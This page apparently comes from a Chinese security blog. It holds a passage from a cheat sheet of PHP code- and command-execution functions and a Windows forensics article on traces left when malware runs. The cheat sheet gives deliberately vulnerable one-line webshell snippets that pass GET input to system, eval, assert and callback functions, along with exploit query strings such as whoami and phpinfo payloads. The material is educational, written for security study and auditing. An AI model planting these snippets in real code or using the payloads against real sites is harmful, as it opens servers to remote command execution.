<p>补充call_user_func函数使用示例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function welcome($name)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;hello $name &lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">call_user_func(&apos;welcome&apos;, &quot;tom&quot;);</span><br><span class="line">call_user_func(&apos;welcome&apos;, &quot;jack&quot;);</span><br><span class="line">//输出 hello tom  hello jack </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h4 id="2-call-user-func-array"><a href="#2-call-user-func-array" class="headerlink" title="2)    call_user_func_array()"></a>2)    call_user_func_array()</h4><p>call_user_func_array ( callable $callback , array $param_arr )<br>call_user_func_array()把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	call_user_func_array($_GET[&apos;a1&apos;],$_GET[&apos;a2&apos;]);</span><br><span class="line">	//xxx.php?a1=system&amp;a2[]=whoami</span><br><span class="line">	//xxx.php?a1=assert&amp;a2[]=phpinfo()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="3-create-function"><a href="#3-create-function" class="headerlink" title="3)    create_function()"></a>3)    create_function()</h4><p>create_function ( string $args , string $code )<br>创建匿名函数（Anonymous functions），允许 临时创建一个没有指定名称的函数。最经常用作回调函数（callback）参数的值<br>create_function内部使用了eval来执行代码。</p>
<p>WordPress &lt;= 4.6.1 使用语言文件任意代码执行漏洞就是由create_function()触发。<br><a href="http://blog.knownsec.com/2016/10/wordpress-4-6-1-language-exploit/" target="_blank" rel="noopener">http://blog.knownsec.com/2016/10/wordpress-4-6-1-language-exploit/</a>  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$b=create_function(&apos;&apos;, @$_REQUEST[&apos;a&apos;]);$b();</span><br><span class="line">//xxx.php?a=phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="4-array-walk"><a href="#4-array-walk" class="headerlink" title="4)    array_walk()"></a>4)    array_walk()</h4><p>rray_walk ( array &amp;$array , callable $callback [, mixed $userdata = NULL ] )<br>array_walk — 使用用户自定义函数对数组中的每个元素做回调处理</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	array_walk($_GET[&apos;a&apos;],$_GET[&apos;b&apos;]);</span><br><span class="line">	//xxx.php?a[]=phpinfo()&amp;b=assert</span><br><span class="line">	//xxx.php?a[]=whoami&amp;b=system</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="5-array-map"><a href="#5-array-map" class="headerlink" title="5)    array_map()"></a>5)    array_map()</h4><p>array_map ( callable $callback , array $array1 [, array $… ] )<br>array_map()为数组的每个元素应用回调函数。<br>返回数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	array_map($_GET[&apos;a&apos;],$_GET[&apos;b&apos;]);  </span><br><span class="line">	//xxx.php?a=system&amp;b[]=whoami</span><br><span class="line">	//xxx.php?a=assert&amp;b[]=phpinfo()</span><br><span class="line">	</span><br><span class="line">	//$array = array(0,1,2,3,4,5);</span><br><span class="line">	//array_map($_GET[&apos;a&apos;],$array);</span><br><span class="line">	//.php?a=phpinfo</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="6-array-filter"><a href="#6-array-filter" class="headerlink" title="6)    array_filter()"></a>6)    array_filter()</h4><p>array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )<br>array_filter()用回调函数过滤数组中的单元。依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true，则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	array_filter(array($_GET[&apos;cmd&apos;]),$_GET[&apos;func&apos;]);</span><br><span class="line">	//?func=system&amp;cmd=whoami</span><br><span class="line">	//?func=assert&amp;cmd=phpinfo()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h4 id="7-usort"><a href="#7-usort" class="headerlink" title="7)    usort()"></a>7)    usort()</h4><p>usort ( array &amp;$array , callable $value_compare_func )<br>本函数将用用户自定义的比较函数对一个数组中的值进行排序</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   //php5.6版本以下 </span><br><span class="line">   usort($_GET,&apos;system&apos;);    //xxx.php?1=1&amp;2=whoami</span><br><span class="line">   //usort($_GET,&apos;assert&apos;);   //xxx.php?1=1&amp;2=phpinfo()</span><br><span class="line">   //usort($_GET,&apos;syst&apos;.&apos;em&apos;);     </span><br><span class="line">   //usort($_GET,&apos;asse&apos;.&apos;rt&apos;);    </span><br><span class="line">   //php5.6以上</span><br><span class="line">   //usort(...$_GET);   xxx.php?1[]=test&amp;1[]=phpinfo();&amp;2=assert</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="8-ob-start"><a href="#8-ob-start" class="headerlink" title="8)    ob_start()"></a>8)    ob_start()</h4><p>ob_start ([ callback $output_callback [, int $chunk_size [, bool $erase ]]] )<br>ob_start — 打开输出控制缓冲</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$cmd = &apos;system&apos;;ob_start($cmd);echo &quot;$_GET[a]&quot;;ob_end_flush();</span><br><span class="line">	//xxx.php?a=whoami</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="9-可变函数-var-args"><a href="#9-可变函数-var-args" class="headerlink" title="9)    可变函数$var(args)"></a>9)    可变函数$var(args)</h4><p><a href="http://php.net/manual/zh/functions.variable-functions.php" target="_blank" rel="noopener">http://php.net/manual/zh/functions.variable-functions.php</a><br>PHP 支持可变函数的概念。如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	$_GET[&apos;a&apos;]($_GET[&apos;b&apos;]);</span><br><span class="line">    //xxx.php?a=system&amp;b=whoami</span><br><span class="line">   //xxx?a=assert&amp;b=phpinfo()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>补充可变函数示例:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function welcome() &#123;</span><br><span class="line">    echo &quot;hello lltest&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test = &apos;welcome&apos;;</span><br><span class="line">$test(); </span><br><span class="line">@$_GET[&apos;a&apos;]();   //xxx.php?a=welcome    </span><br><span class="line"></span><br><span class="line">function welcome2($name) &#123;  //带参数</span><br><span class="line">    echo &quot;hello $name&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">@$_GET[&apos;b&apos;]($_GET[&apos;c&apos;]);   //xxx.php?a=welcome&amp;b=welcome2&amp;c=tom</span><br></pre></td></tr></table></figure></p>
<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><h4 id="10-system"><a href="#10-system" class="headerlink" title="10)    system()"></a>10)    system()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	system($_GET[&apos;a&apos;]);</span><br><span class="line">	//xxx.php?a=whoami</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="11-passthru"><a href="#11-passthru" class="headerlink" title="11)    passthru()"></a>11)    passthru()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	passthru($_GET[&apos;a&apos;]);</span><br><span class="line">	//xxx.php?a=whoami</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="12-exec"><a href="#12-exec" class="headerlink" title="12)    exec()"></a>12)    exec()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$output = exec($_GET[&apos;a&apos;]);</span><br><span class="line">	echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;</span><br><span class="line">	//xxx.php?a=whoami</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="13-shell-exec"><a href="#13-shell-exec" class="headerlink" title="13)    shell_exec()"></a>13)    shell_exec()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$output = shell_exec($_GET[&apos;a&apos;]);</span><br><span class="line">	echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;</span><br><span class="line">	//xxx.php?a=whoami</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="14-pcntl-exec"><a href="#14-pcntl-exec" class="headerlink" title="14)    pcntl_exec()"></a>14)    pcntl_exec()</h4><p>pcntl_exec — 在当前进程空间执行指定程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	pcntl_exec( &quot;/bin/bash&quot; , array(&quot;whoami&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h4 id="15-popen"><a href="#15-popen" class="headerlink" title="15)    popen()"></a>15)    popen()</h4><p>popen ( string $command , string $mode )<br>popen — 打开进程文件指针。打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">	$test = &quot;whoami&quot;;  </span><br><span class="line">	$fp = popen($test,&quot;r&quot;);  //popen打一个进程通道  </span><br><span class="line">  </span><br><span class="line">	while (!feof($fp)) &#123;      //从通道取出内容 </span><br><span class="line">		$out = fgets($fp, 4096);  </span><br><span class="line">		echo  $out;          </span><br><span class="line">	&#125;  </span><br><span class="line">	pclose($fp);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="16-proc-open"><a href="#16-proc-open" class="headerlink" title="16)    proc_open()"></a>16)    proc_open()</h4><p>proc_open — 执行一个命令，并且打开用来输入/输出的文件指针<br>类似 popen() 函数， 但是 proc_open() 提供了更加强大的控制程序执行的能力<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">	$test = &quot;whoami&quot;;  </span><br><span class="line">	$array =   array(  </span><br><span class="line">	array(&quot;pipe&quot;,&quot;r&quot;),   //标准输入  </span><br><span class="line">	array(&quot;pipe&quot;,&quot;w&quot;),   //标准输出内容  </span><br><span class="line">	array(&quot;pipe&quot;,&quot;w&quot;)    //标准输出错误  </span><br><span class="line"> );  </span><br><span class="line">  </span><br><span class="line">	$fp = proc_open($test,$array,$pipes);   //打开一个进程通道  </span><br><span class="line">	echo stream_get_contents($pipes[1]);    //为什么是$pipes[1]，因为1是输出内容  </span><br><span class="line">	proc_close($fp);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h4 id="17-反单引号"><a href="#17-反单引号" class="headerlink" title="17)    反单引号"></a>17)    反单引号</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	echo `whoami`;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><h4 id="18-eval"><a href="#18-eval" class="headerlink" title="18)    eval()"></a>18)    eval()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	eval($_GET[&apos;a&apos;]);</span><br><span class="line">	//xxx.php?a=phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="19-assert"><a href="#19-assert" class="headerlink" title="19)    assert()"></a>19)    assert()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	assert($_GET[&apos;a&apos;]);</span><br><span class="line">	//xxx.php?a=phpinfo()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="20-preg-replace"><a href="#20-preg-replace" class="headerlink" title="20)    preg_replace()"></a>20)    preg_replace()</h4><p>php7.0.0不再支持 /e修饰符；php5.5.0     /e 修饰符已被弃用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">@preg_replace(&quot;/abc/e&quot;,$_REQUEST[&apos;a&apos;],&quot;abcd&quot;);</span><br><span class="line">//xxx.php?a=phpinfo()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h4 id="21"><a href="#21" class="headerlink" title="21)    $"></a>21)    $</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	$&#123;phpinfo()&#125;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>参考:<br><a href="https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a>  php代码/命令执行漏洞<br><a href="https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html</a> eval长度限制绕过 &amp;&amp; PHP5.6新特性</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/29/取证分析之发现Windows恶意程序执行痕迹/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="pplsec">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/ppl.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="pplsec">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/10/29/取证分析之发现Windows恶意程序执行痕迹/" itemprop="url">取证分析之发现Windows恶意程序执行痕迹</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-29T09:38:36+08:00">
                2018-10-29
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/应急响应/" itemprop="url" rel="index">
                    <span itemprop="name">应急响应</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>2018-10-29 首发于阿里先知: <a href="https://xz.aliyun.com/t/3067" target="_blank" rel="noopener">https://xz.aliyun.com/t/3067</a></p>
<p>本文主要简述当Windows系统中存在恶意可执行程序时，如何发现恶意程序的执行痕迹（文件路径、时间等），以及相关的辅助分析工具。<br>从注册表、文件、日志三个方面介绍，以及简单介绍下Win10中的几个特有功能。</p>
<h3 id="一、注册表"><a href="#一、注册表" class="headerlink" title="一、注册表"></a>一、注册表</h3><h4 id="1-ShimCache"><a href="#1-ShimCache" class="headerlink" title="1)ShimCache"></a>1)ShimCache</h4><p>ShimCache 又称为AppCompatCache，从 Windows XP开始存在，用来识别应用程序兼容性问题。跟踪文件路径，大小和上次修改时间（LastModifiedTime）和上次更新时间（LastUpdateTime）。<br>其中在Windows7/8/10系统中最多包含1024条记录，Windows7/8/10系统中不存在“上次更新时间”。<br>注册表中位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache</span><br></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027182010-e26034c0-d9d1-1.png" alt=""></p>
<h5 id="辅助工具AppCompatCacheParser"><a href="#辅助工具AppCompatCacheParser" class="headerlink" title="辅助工具AppCompatCacheParser"></a>辅助工具AppCompatCacheParser</h5><p><a href="https://github.com/EricZimmerman/AppCompatCacheParser/" target="_blank" rel="noopener">https://github.com/EricZimmerman/AppCompatCacheParser/</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usage：</span><br><span class="line">AppCompatCacheParser.exe --csv d:\temp  -t</span><br></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027182152-1f1ba99e-d9d2-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027182204-2689023a-d9d2-1.png" alt=""></p>
<h5 id="辅助工具ShimCacheParser"><a href="#辅助工具ShimCacheParser" class="headerlink" title="辅助工具ShimCacheParser"></a>辅助工具ShimCacheParser</h5><p><a href="https://github.com/mandiant/ShimCacheParser" target="_blank" rel="noopener">https://github.com/mandiant/ShimCacheParser</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usage：</span><br><span class="line">reg export &quot;HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache&quot; shimcache.reg</span><br><span class="line">ShimCacheParser.py -o out.csv -r D:\Tool\TEST\shimcache.reg -t</span><br></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027182432-7ebb7ff0-d9d2-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027182443-851cca34-d9d2-1.png" alt=""></p>
<h4 id="2-UserAssist"><a href="#2-UserAssist" class="headerlink" title="2)UserAssist"></a>2)UserAssist</h4><p>userassist键值包含GUI应用执行的信息，如名称、路径、关联快捷方式、执行次数、上一次执行时间等。<br>注册表中位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\&#123;GUID&#125;\Count</span><br></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027182646-cea366e0-d9d2-1.png" alt="image.png"></p>
<h5 id="辅助工具UserAssist-V2-6-0"><a href="#辅助工具UserAssist-V2-6-0" class="headerlink" title="辅助工具UserAssist_V2_6_0"></a>辅助工具UserAssist_V2_6_0</h5><p><a href="https://blog.didierstevens.com/programs/userassist/" target="_blank" rel="noopener">https://blog.didierstevens.com/programs/userassist/</a><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027182827-0aeb287c-d9d3-1.png" alt="image.png"></p>
<h4 id="3-MUICache"><a href="#3-MUICache" class="headerlink" title="3)MUICache"></a>3)MUICache</h4><p>MUICache记录执行程序的名称和路径，但是没有记录相关执行时间。<br>注册表中位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKCU/Software/Microsoft/Windows/ShellNoRoam/MUICache (XP, 2000, 2003) </span><br><span class="line">HKCU/Software/Classes/Local Settings/Software/Microsoft/Windows/Shell/MuiCache  (Vista, 7, 2008)</span><br></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027183121-721a720a-d9d3-1.png" alt="image.png"></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027183131-786d3822-d9d3-1.png" alt="image.png"></p>
<h5 id="辅助工具muicache-view"><a href="#辅助工具muicache-view" class="headerlink" title="辅助工具muicache_view"></a>辅助工具muicache_view</h5><p><a href="http://www.nirsoft.net/utils/muicache_view.html" target="_blank" rel="noopener">http://www.nirsoft.net/utils/muicache_view.html</a></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027183158-8882060c-d9d3-1.png" alt="image.png"></p>
<h3 id="二、文件"><a href="#二、文件" class="headerlink" title="二、文件"></a>二、文件</h3><h4 id="1-Prefetch"><a href="#1-Prefetch" class="headerlink" title="1)Prefetch"></a>1)Prefetch</h4><p>Prefetch（预读取），从Windows XP开始引入，用来加速应用程序启动过程。Prefetch包含可执行文件的名称、文件时间戳、运行次数、上次执行时间、Hash等。<br>Win7上记录最近128个可执行文件的信息，Win8-10上的最近1024个可执行文件。</p>
<p>文件路径:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Prefetch</span><br></pre></td></tr></table></figure></p>
<p>注册表HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters  中EnablePrefetcher的键值控制是否开启Prefetch。<br>EnablePrefetcher的数值设置：<br>0 =已禁用<br>1 =启用应用程序预读取<br>2 =启用引导预读取<br>3 =启用应用程序和引导预读取（最佳和默认）<br>虽然Windows 2003中也存在Prefetch，但默认为2,仅用于引导预读取。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027183526-044c3d66-d9d4-1.png" alt="image.png"></p>
<h5 id="辅助工具PECmd"><a href="#辅助工具PECmd" class="headerlink" title="辅助工具PECmd"></a>辅助工具PECmd</h5><p><a href="https://github.com/EricZimmerman/PECmd" target="_blank" rel="noopener">https://github.com/EricZimmerman/PECmd</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usage：</span><br><span class="line">PECmd.exe -d &quot;C:\Windows\Prefetch&quot; --csv &quot;d:\temp&quot; --json d:\temp\json</span><br></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027183717-46713b10-d9d4-1.png" alt="image.png"></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027183726-4becd87e-d9d4-1.png" alt="image.png"></p>
<h4 id="2-Amcache"><a href="#2-Amcache" class="headerlink" title="2)Amcache"></a>2)Amcache</h4><p>Amcache.hve记录执应用程序的执行路径、上次执行时间、以及SHA1值。<br>文件路径:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\AppCompat\Programs\Amcache.hve</span><br></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027183739-537a5f6c-d9d4-1.png" alt="image.png"></p>
<h4 id="辅助工具AmcacheParse"><a href="#辅助工具AmcacheParse" class="headerlink" title="辅助工具AmcacheParse"></a>辅助工具AmcacheParse</h4><p><a href="https://github.com/EricZimmerman/AmcacheParser" target="_blank" rel="noopener">https://github.com/EricZimmerman/AmcacheParser</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usage：</span><br><span class="line">AmcacheParser.exe -f C:\Windows\AppCompat\Programs\Amcache.hve --csv d:\temp</span><br></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027183822-6d073a72-d9d4-1.png" alt="image.png"></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027183830-724ff78a-d9d4-1.png" alt="image.png"></p>
<h4 id="3-Jump-Lists"><a href="#3-Jump-Lists" class="headerlink" title="3)Jump Lists"></a>3)Jump Lists</h4><p>Windows 7-10用来任务栏显示经常使用或最近使用的项目。<br>文件路径：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations</span><br></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027183913-8bfec36e-d9d4-1.png" alt="image.png"></p>
<h4 id="辅助工具JumpListExplorer"><a href="#辅助工具JumpListExplorer" class="headerlink" title="辅助工具JumpListExplorer"></a>辅助工具JumpListExplorer</h4><p><a href="https://ericzimmerman.github.io/Software/JumpListExplorer.zip" target="_blank" rel="noopener">https://ericzimmerman.github.io/Software/JumpListExplorer.zip</a></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027183942-9d0f0a88-d9d4-1.png" alt="image.png"></p>
<h3 id="三、日志"><a href="#三、日志" class="headerlink" title="三、日志"></a>三、日志</h3><h4 id="1-安全事件日志Security-Log-592-4688"><a href="#1-安全事件日志Security-Log-592-4688" class="headerlink" title="1) 安全事件日志Security Log (592/4688)"></a>1) 安全事件日志Security Log (592/4688)</h4><p>Windows 7、Windows Server 2008 R2 /2012 及之后，会在每次创建一个进程时创建一个事件日志，并传递到该进程的命令行信息。事件将记录到现有事件 ID 4688 并保存到 Windows 安全日志。但仅在启用了“审核进程创建”时记录4688。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">592   创建一个新进程（Windows Server 2003）</span><br><span class="line">4688  创建一个新进程（Windows 7、Windows Server 2008 R2/ 2012及之后）</span><br></pre></td></tr></table></figure></p>
